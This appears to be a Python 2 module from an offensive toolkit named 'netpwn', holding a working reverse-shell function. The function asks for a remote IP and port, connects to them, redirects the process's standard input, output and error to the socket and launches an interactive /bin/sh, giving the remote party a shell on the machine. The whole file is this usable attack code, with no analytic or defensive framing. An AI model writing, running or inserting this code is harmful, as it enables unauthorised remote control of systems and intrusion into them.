#!/usr/bin/python
"""Reverse shell module."""

import os
import socket
import subprocess

from termcolor import colored


def reverse_shell():
    """Create a reverse shell using /bin/sh."""
    try:
        print colored('Enter the IP to connect to', 'green')
        tgt_host = raw_input(colored('(netpwn: reverse_shell) > ', 'red'))
        print colored('Enter the port to connect to', 'green')
        tgt_port = int(raw_input(colored('(netpwn: reverse_shell) > ', 'red')))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((tgt_host, tgt_port))
        os.dup2(sock.fileno(), 0)
        os.dup2(sock.fileno(), 1)
        os.dup2(sock.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()

    except socket.error:
        print colored('Could not connect to host', 'yellow')

    except ValueError:
        print colored('Not a valid IP or port', 'yellow')
